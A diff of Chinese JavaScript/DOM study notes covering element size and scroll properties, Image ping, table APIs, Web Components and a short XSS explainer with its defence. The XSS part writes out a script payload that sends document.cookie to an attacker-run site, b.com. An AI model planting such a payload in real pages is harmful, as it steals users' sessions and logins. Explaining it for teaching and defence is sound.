@@ -104,8 +104,7 @@ DOM,Document Object Model 文档对象模型
     Node.ENTITY_REFERENCE_NODE; // 5,表示一个实体引用
     Node.ENTITY_NODE;  // 6,在XML文档中表示一个实体
     Node.NOTATION_NODE; // 12,在XML文档中表示一个符号
-  e.g. :
-  document.nodeType == Node.DOCUMENT_NODE;  // true
+  e.g. :  document.nodeType == Node.DOCUMENT_NODE;  // true
   ◆节点关系:
   文档中所有的节点之间都存在则关系.
   同一类型节点间的关系可类比为家族关系,
@@ -684,9 +683,9 @@ DOM,Document Object Model 文档对象模型
     }
     ul.appendChild(fragment);
   CDATASection 类型:只针对基于XML的文档,表示CDATA区域
-  框架 [非节点类型之一]
+  框架「非节点类型之一」 
     框架和内嵌框架分别用 HTMLFrameElement 和 HTMLIFrameElement 表示.
-    elem.contentDocument 表示执行框架的文档对象  [DOM2级中] [IE8-不支持]
+    elem.contentDocument 表示执行框架的文档对象  「DOM2 IE8+」 
       此前无法直接通过元素获取到文档对象,只能使用frames集合.
     elem.contentWindow 返回框架的window对象 [所有都支持]
       然后.document 再获取到document对象
@@ -880,9 +879,9 @@ DOM,Document Object Model 文档对象模型
   DOM2遍历和范围  [更多详见 JavaScript高级程序设计 327 页]
 DOM操作归纳总结 
   创建 elem 
-    var img =new Image(); 创建图片对象
+    var img = new Image(); 创建图片对象 
       e.g. img.src="图片地址"
-    var opt =new Options(["文本","值",bool,bool]); 创建option对象
+    var opt = new Options(["文本","值",bool,bool]); 创建option对象 
       两个 bool 分别表示是否被选中和是否有效
       [详见 表单脚本]
       e.g.:
@@ -892,9 +891,9 @@ DOM操作归纳总结
       elem.options.add(new Option("text","value"));
       elem.options.remove(index); // 根据下标删除选项option
       elem.options[index].text;
-    document.createElement("元素名a"); 创建元素对象,创建一个空元素a
+    document.createElement("元素名a"); 创建元素对象,创建一个空元素a 
       (详见: 节点类型&详解 Document 创建)
-    nod.cloneNode(bool); 复制节点(详见: Node节点)
+    nod.cloneNode(bool); 复制节点「详见: Node节点」 
   获取 elem 
     快捷方法获取
       document.documentElement  表示整个HTML
@@ -936,11 +935,8 @@ DOM操作归纳总结
       elem.firstChild 第一个子节点
       elem.lastChild 最后一个子节点
       ◆其他信息获取
-      elem.offsetParent 只读,最近的(指包含层级上的最近)包含该元素的定位元素
-        PS:
-          若无定位元素,则为最近的 table 元素对象或根元素
-            (标准模式下为 html；quirks 模式下为 body).
-          当元素的 style.display 设置为 "none" 时,offsetParent 返回 null.
+      elem.offsetParent 只读,最近的包含该元素的定位元素
+        PS: 若无定位元素,则为body;当元素display:none,其offsetParent为null;
   操作 elem 
     元素增删查改 
       Nod.hasChildNodes(nod); 是否包含节点
@@ -957,12 +953,18 @@ DOM操作归纳总结
       Nod.replaceChild(); 替换子元素 (详见: Node操作部分)
       elem.remove();     删除元素 [可能有兼容问题] [IE11不支持]
     元素的尺寸、位置
-      elem.offsetHeight 元素的高度,content+padding+border+scrollbar [DiBs]
+      PS：为方便描述,设定 元素的边界宽为content+padding+border+margin,
+        元素布局宽为content+padding+border,元素内宽为content+padding,
+        元素宽为content的宽度「在box-sizing:content-box的默认条件下」
+        高度同理;
+        当元素出现滚动条时,元素不会'膨胀',只会'挤压'其内部元素;
+      elem.offsetHeight 元素布局高「DiBs」 
+        包含scrollbar
         和元素内部的内容是否超出元素无关,只和width和border有关
-      elem.offsetWidth  元素的宽度,content+padding+border+scrollbar [DiBs]
+      elem.offsetWidth  元素布局宽「DiBs」
       elem.offsetTop    元素相对其offsetParent「定位的父元素」的top
       elem.offsetLeft   元素相对其offsetParent「定位的父元素」的left
-      elem.clientWidth    只读,边内宽,content+padding 
+      elem.clientWidth    只读,元素内宽 
         不包括边框(IE下包括)、滚动条部分
           windows 中出现滚动条时为 content+padding-滚动条的宽度
           mac 中滚动条在未拖动时自动隐藏,因此不影响 
@@ -983,16 +985,17 @@ DOM操作归纳总结
           大多数情况下,都是document.documentElement.clientWidth 返回正确值.
           但在IE6的quirks模式中,document.body.clientWidth 返回正确的值,
           因此函数中加入了对文档模式的判断.
-      elem.clientHeight   只读,边内高,content+padding
-      elem.clientTop      border-top的宽度
-      elem.clientLeft     border-left的宽度
-      elem.scrollWidth      元素可视部分及滚动隐藏部分的宽度和
-      elem.scrollHeight     元素可视部分及滚动隐藏部分的高度和
-        包括元素的padding,但不包括元素的margin.
-      elem.scrollTop        读写元素滚动到的视口的高度位置
-      elem.scrollLeft       读写元素滚动到的视口的宽度位置
-      elem.scrollIntoView() 将指定的节点设置为默认在可视窗口内
-      elem.style.left 读写相对于具有定位属性父元素对象的边距
+      elem.clientHeight   只读,元素内高 
+      elem.clientTop      'border-top-width'的值
+      elem.clientLeft     'border-left-width'的值
+      elem.scrollWidth  布局宽+滚动隐藏宽
+        包括元素的padding,但不包括元素的margin
+        document.body.scrollWidth 在其布局宽和浏览器宽中取较大者,高度同理;
+      elem.scrollHeight 布局高+滚动隐藏高 
+      elem.scrollTop    读写,元素垂直滚动距离
+      elem.scrollLeft   读写,元素水平滚动距离
+      elem.scrollIntoView() 将节点滚动到可视窗口中 
+      elem.style.left    读写,相对于具有定位属性父元素对象的边距 
         获取或设置相对于具有定位属性(position定义为relative)的父对象的左边距;
         子元素对象.style.left
         子元素对象.style.top
@@ -1000,7 +1003,7 @@ DOM操作归纳总结
         Remarks:
           style.left的值需要事先定义在html里(对象的标签里),否则取到的值为空.若定义在css里,style.left的值仍然为空,仍取不到值
       elem.getBoundingClientRect() 获取元素位置对象
-        返回一个对象,用于获得元素相对视口的位置 [可能存在兼容问题]
+        返回一个对象,用于获得元素相对视口的位置 「DiBs」
         有6个属性：top,lef,right,bottom,width,height
           width、height是元素自身的宽高
           right是指元素右边界距窗口最左边的距离,
@@ -3231,165 +3234,168 @@ Web_Workers 工作线程 「HTML5」
           }
         }
 ◆其他 
-Img Ping 跨域 
-  PS:一网页可以从任何网页中加载图像,而无跨域问题,也是在线广告跟踪浏览量的主要方式;
-    动态的创建图像,使用load和error事件来处理响应
-    图像Ping时与服务器进行简单、单向的跨域通信的一种方式
-    请求的数据是通过查询字符串形式发送
-    响应可以是任意内容
-    请求从设置src属性时发生
-  e.g. :
-    var img =new Image();
-    img.onload =img.onerror =function(){
-      console.log(1);
-    }
-    img.src ="https://www.baidu.com?name=abc"; // 请求中发送了一个name参数
-    onload 和 onerror 事件处理程序指定为同一个函数,
-    则无论什么响应,请求完成都能得到通知
-  图像Ping的缺点
-    只能发送 GET 请求,无法访问服务器的响应文本
-    只能由从浏览器到服务器间的单向通信
-XML 命名空间
-  有了XML命名空间,不同XML文档的元素就可以混合在一起,而不发生命名冲突
-  HTML不支持XML命名空间,但XHTML支持XML命名空间
- (更多详情参见 JavaScript高级程序设计 306页)
- (只有在使用XML和XHTML文档时才有用)
-动态加载脚本和样式 
-  动态脚本
-    当引入太多的js脚本而降低了整站的性能,所以就出现了动态脚本的概念,
-    动态脚本就是在适当的时候加载相应的脚本.
-    如页面加载时不存在,在将来的某一刻通过修改DOM动态添加的脚本
-    动态加载的外部JavaScript文件能够立即运行
-  动态样式
-    与动态脚本类似,是指在页面刚加载时不存在的样式,后续添加到页面中的.
-HTML DOM 
-  使用HTML DOM操作,可查询 HTML DOM手册
-  e.g. :
-  使用HTML DOM来获取和创建表格
-  var table =document.getElementsByTagName('table')[0];
-  table.caption.innerHTML;
-  // table.caption.innerHTML = 'abc';
-  table.tHead;
-  table.tBodies[0];
-  table.rows.length;             //得到总行数
-  // 该处的rows属性为table下提供的
-  table.tBodies[0].rows.length;   //得到tbody中的行数
-  // 该处的rows属性为tbody下提供的,和上面的rows不是一个.
-  table.tBodies[0].rows[0].cells.length;
+  Img Ping 跨域 
+    PS:一网页可以从任何网页中加载图像,而无跨域问题,也是在线广告跟踪浏览量的主要方式;
+      动态的创建图像,使用load和error事件来处理响应
+      图像Ping时与服务器进行简单、单向的跨域通信的一种方式
+      请求的数据是通过查询字符串形式发送
+      响应可以是任意内容
+      请求从设置src属性时发生
+    e.g. :
+      var img =new Image();
+      img.onload =img.onerror =function(){
+        console.log(1);
+      }
+      img.src ="https://www.baidu.com?name=abc"; // 请求中发送了一个name参数
+      onload 和 onerror 事件处理程序指定为同一个函数,
+      则无论什么响应,请求完成都能得到通知
+    图像Ping的缺点
+      只能发送 GET 请求,无法访问服务器的响应文本
+      只能由从浏览器到服务器间的单向通信
+  XML 命名空间
+    有了XML命名空间,不同XML文档的元素就可以混合在一起,而不发生命名冲突
+    HTML不支持XML命名空间,但XHTML支持XML命名空间
+   (更多详情参见 JavaScript高级程序设计 306页)
+   (只有在使用XML和XHTML文档时才有用)
+  动态加载脚本和样式 
+    动态脚本
+      当引入太多的js脚本而降低了整站的性能,所以就出现了动态脚本的概念,
+      动态脚本就是在适当的时候加载相应的脚本.
+      如页面加载时不存在,在将来的某一刻通过修改DOM动态添加的脚本
+      动态加载的外部JavaScript文件能够立即运行
+    动态样式
+      与动态脚本类似,是指在页面刚加载时不存在的样式,后续添加到页面中的.
+  HTML DOM 
+    使用HTML DOM操作,可查询 HTML DOM手册
+    e.g. :
+    使用HTML DOM来获取和创建表格
+    var table =document.getElementsByTagName('table')[0];
+    table.caption.innerHTML;
+    // table.caption.innerHTML = 'abc';
+    table.tHead;
+    table.tBodies[0];
+    table.rows.length;             //得到总行数
+    // 该处的rows属性为table下提供的
+    table.tBodies[0].rows.length;   //得到tbody中的行数
+    // 该处的rows属性为tbody下提供的,和上面的rows不是一个.
+    table.tBodies[0].rows[0].cells.length;
 
-  使用HTML DOM来创建表格
-  var table =document.createElement('table');
-  table.width =300;
-  table.border =1;
-  table.createCaption().innerHTML ='人员表';
-  var thead =table.createHead();
-  var tr =thead.insertRow(0);
-  tr.insertCell(0).innerHTML ="数据1"
-  tr.insertCell(2).innerHTML ="数据2"
-  tr.insertCell(3).innerHTML ="数据3"
-  document.body.appendChild(table);
-JavaScript&XML (详参 JavaScript高级程序设计 552 页)
-XSS,Cross SiteScript 跨站脚本攻击 
-  PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
-    理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
-  原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
-    当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
-    如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
-  DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
-    e.g.:
-      如一个获取他人Cookie的超链接,
-      'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
-      当点击这个链接的时候「假设点击者已经登录a.com」,浏览器就会直接打开b.com,
-      并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
-      当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
-      cookie信息中可能存有登录密码,攻击成功！
-  Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
-    e.g.:
-      a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
-      <script>window.open(“www.b.com?param=”+document.cookie)</script>,
-      保存文章,这时当在查看攻击者的文章时就都中招了,
-      他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
-  XSS防御 
-    永远不相信用户的输入,输入验证
-    Html encode,对标签进行转换
-      比如输入：'<script>window.location.href=”http://www.baidu.com”;</script>',
-      最终存储的会是：
-      '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
-      在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码。
-Web_Components 组件化 
-  Custom Elements  自定义HTML元素,包括特定的组成、样式和行为
-    支持该标准的浏览器会提供一系列 API 给开发者用于创建自定义的元素,或者扩展现有元素
-    document.registerElement('x-aoo', {      注册标签
-      prototype: Object.create(HTMLElement.prototype, {
-        createdCallback: { 
-          value: function() { ... } 
-        },
-        ...     
-      }) })
+    使用HTML DOM来创建表格
+    var table =document.createElement('table');
+    table.width =300;
+    table.border =1;
+    table.createCaption().innerHTML ='人员表';
+    var thead =table.createHead();
+    var tr =thead.insertRow(0);
+    tr.insertCell(0).innerHTML ="数据1"
+    tr.insertCell(2).innerHTML ="数据2"
+    tr.insertCell(3).innerHTML ="数据3"
+    document.body.appendChild(table);
+  JavaScript&XML「详参 JavaScript高级程序设计 552 页」 
+  XSS,Cross SiteScript 跨站脚本攻击 
+    PS:Web程序中常见的漏洞,属于被动式且用于客户端的攻击方式;
+      理论上,所有可输入的地方没有对输入数据进行处理的话,都会存在XSS漏洞;
+    原理:攻击者向有XSS漏洞的网站中输入或传入恶意的HTML代码,
+      当其它用户浏览该网站时,这段HTML代码会自动执行,从而达到攻击的目的。
+      如盗取用户Cookie、破坏页面结构、重定向到其它网站等。
+    DOM Based XSS 漏洞: 基于网页DOM结构的攻击,特点是中招的人是少数人
+      e.g.:
+        如一个获取他人Cookie的超链接,
+        'http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>',
+        当点击这个链接的时候「假设点击者已经登录a.com」,浏览器就会直接打开b.com,
+        并且把点击者在 a.com 中的 cookie信息发送到 b.com, b.com 就是攻击者搭建的网站,
+        当网站接收到该信息时,就盗取了受害者在 a.com 的cookie信息,
+        cookie信息中可能存有登录密码,攻击成功！
+    Stored XSS 漏洞: 攻击代码已经存储到服务器上或者数据库中
+      e.g.:
+        a.com 可以发文章,攻击者登录后在a.com 中发布了一篇文章, 文章中包含了恶意代码,
+        <script>window.open(“www.b.com?param=”+document.cookie)</script>,
+        保存文章,这时当在查看攻击者的文章时就都中招了,
+        他们的cookie信息都发送到了攻击者的服务器上,攻击成功！
+    XSS防御 
+      永远不相信用户的输入,输入验证
+      Html encode,对标签进行转换
+        比如输入：'<script>window.location.href=”http://www.baidu.com”;</script>',
+        最终存储的会是：
+        '&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;'
+        在展现时浏览器会对这些字符转换成文本内容显示,而不是一段可执行的代码。
+  Web_Components 组件化 
+    Custom Elements  自定义HTML元素,包括特定的组成、样式和行为
+      支持该标准的浏览器会提供一系列 API 给开发者用于创建自定义的元素,或者扩展现有元素
+      document.registerElement('x-aoo', {      // 注册标签
+        prototype: Object.create(HTMLElement.prototype, {
+          createdCallback: { 
+            value: function() {
+              //  ...
+            } 
+          },
+          // ...     
+        }) 
+      })
       x-aoo  标签类型「名字」需使用 - 连接
       不能是以下这些：
       annotation-xml、color-profile、font-face、font-face-src、
       font-face-uri、font-face-format、font-face-name、missing-glyph
       第二个参数是标签相关的配置,提供一个 prototype(以 HTMLElement 的原型为基础创建的对象)
-      e.g.:
-        在 HTML 中去使用自定义的标签：
-        <div> <x-foo></x-foo> </div>
-  HTML Imports
-  HTML Templates
-  Shadow DOM     隔离组件间代码的冲突和影响
-  生命周期和回调：
-    Web Components 标准提供一系列控制自定义元素的方法
-    一个自定义元素会经历以下生命周期：
-      注册前创建
-      注册自定义元素定义
-      在注册后创建元素实例
-      元素**到 document 中
-      元素从 document 中移除
-    ◆回调: 
-      PS:元素的属性变化时
-        在注册新的自定义元素时指定对应的生命周期回调,为自定义元素添加各种自定义的行为
-        生命周期回调包括(括号中为 Custom Elements 2016.07.21 新标准)：
-    createdCallback(constructor in class)  自定义元素注册后,在实例化之后会调用
-      (多用于做元素的初始化：如**子元素,绑定事件等)
-    attachedCallback(connectedCallback)    元素**到 document 时触发
-    detachedCallback(disconnectedCallback) 元素从 document 中移除时触发
-      (用于做类似 destroy 之类的事情)
-    attributeChangedCallback               元素属性变化时触发
-      (可以用于从外到内的通信：外部通过修改元素的属性来让内部获取相关的数据并且执行对应的操作)
-      这个回调在不同情况下有对应不同的参数：
-      设置属性时,参数列表是：属性名称,null,值,命名空间
-      修改属性时,参数列表是：属性名称,旧值,新值,命名空间
-      删除属性时,参数列表是：属性名称,旧值,null,命名空间
-    adoptedCallback：              使用 document.adoptNode(node) 时触发
-    e.g.: 
-      创建一个自定义的 button-hello 按钮,点击时会 alert('hello world')：
-      document.registerElement('button-hello', {
-        prototype: Object.create(HTMLButtonElement.prototype, {
-          createdCallback: {
-            value: function createdCallback() {
-              this.innerHTML = '<button>hello world</button>'
-              this.addEventListener('click', () => { alert('hello world') })
+        e.g.:
+          在 HTML 中去使用自定义的标签：
+          <div> <x-foo></x-foo> </div>
+    HTML Imports
+    HTML Templates
+    Shadow DOM     隔离组件间代码的冲突和影响
+    生命周期和回调：
+      Web Components 标准提供一系列控制自定义元素的方法
+      一个自定义元素会经历以下生命周期：
+        注册前创建
+        注册自定义元素定义
+        在注册后创建元素实例
+        元素**到 document 中
+        元素从 document 中移除
+      ◆回调: 
+        PS:元素的属性变化时
+          在注册新的自定义元素时指定对应的生命周期回调,为自定义元素添加各种自定义的行为
+          生命周期回调包括(括号中为 Custom Elements 2016.07.21 新标准)：
+      createdCallback(constructor in class)  自定义元素注册后,在实例化之后会调用
+        (多用于做元素的初始化：如**子元素,绑定事件等)
+      attachedCallback(connectedCallback)    元素**到 document 时触发
+      detachedCallback(disconnectedCallback) 元素从 document 中移除时触发
+        (用于做类似 destroy 之类的事情)
+      attributeChangedCallback               元素属性变化时触发
+        (可以用于从外到内的通信：外部通过修改元素的属性来让内部获取相关的数据并且执行对应的操作)
+        这个回调在不同情况下有对应不同的参数：
+        设置属性时,参数列表是：属性名称,null,值,命名空间
+        修改属性时,参数列表是：属性名称,旧值,新值,命名空间
+        删除属性时,参数列表是：属性名称,旧值,null,命名空间
+      adoptedCallback：              使用 document.adoptNode(node) 时触发
+      e.g.: 
+        创建一个自定义的 button-hello 按钮,点击时会 alert('hello world')：
+        document.registerElement('button-hello', {
+          prototype: Object.create(HTMLButtonElement.prototype, {
+            createdCallback: {
+              value: function createdCallback() {
+                this.innerHTML = '<button>hello world</button>'
+                this.addEventListener('click', () => { alert('hello world') })
+              }
             }
-          }
+          })
         })
-      })
-      注：上述代码执行之后才能使用 <button-hello></button-hello>
-  扩展原有元素：
-    Web Components 标准提供了一种扩展现有标签的方式
-    class ButtonHelloElement extends HTMLButtonElement {
-      constructor() {
-        super() ,
-        this.addEventListener('click', () => {
-          alert('hello world') 
-        }) 
+        注：上述代码执行之后才能使用 <button-hello></button-hello>
+    扩展原有元素：
+      Web Components 标准提供了一种扩展现有标签的方式
+      class ButtonHelloElement extends HTMLButtonElement {
+        constructor() {
+          super() ,
+          this.addEventListener('click', () => {
+            alert('hello world') 
+          }) 
+        } 
       } 
-    } 
-    customElements.define('button-hello', ButtonHelloElement, {
-      extends: 'button' 
-    })
-    使用 is 属性来声明一个扩展的类型
-    Web Components 标准中：createElement 和 createElementNS 支持元素扩展：
-      const hello = document.createElement('button', 'button-hello')
+      customElements.define('button-hello', ButtonHelloElement, {
+        extends: 'button' 
+      })
+      使用 is 属性来声明一个扩展的类型
+      Web Components 标准中：createElement 和 createElementNS 支持元素扩展：
+        const hello = document.createElement('button', 'button-hello')
 -------------------------------------------------------------------------待整理
   套接字
   
